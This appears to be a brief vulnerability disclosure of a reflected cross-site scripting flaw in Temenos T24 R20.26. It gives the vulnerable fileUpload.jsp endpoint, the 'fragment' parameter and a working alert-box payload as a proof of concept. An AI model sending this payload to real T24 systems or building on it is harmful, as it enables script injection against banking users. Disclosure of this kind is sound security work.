# Reflected-XSS-T24
In Temenos T24 R20.26, I found Reflected-XSS fileUpload.jsp
Reproduce bug:
Send request to https://{url}/BrowserWeb/jsps/fileUpload.jsp with payload xss in 'fragment' parameter
Payload : "><img src=1 onerror=alert(1337)>
